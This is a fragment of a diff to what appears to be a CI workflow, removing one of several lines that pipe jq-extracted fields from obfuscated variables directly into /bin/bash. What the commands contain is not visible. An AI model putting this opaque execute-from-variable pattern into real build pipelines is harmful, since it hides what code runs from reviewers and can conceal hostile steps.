@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$gs27038" | jq -r .isnyz99155 | /bin/bash
           echo $a94412 | jq -r .p26488 | /bin/bash
           echo $swb21919 | jq -r .z185 | /bin/bash
-          echo $kn839 | jq -r .vp2 | /bin/bash
           echo $tp47 | jq -r .yqbaq8 | /bin/bash
           echo $wypx577 | jq -r .ne6466 | /bin/bash
           echo $hgosh0 | jq -r .xtt23 | /bin/bash
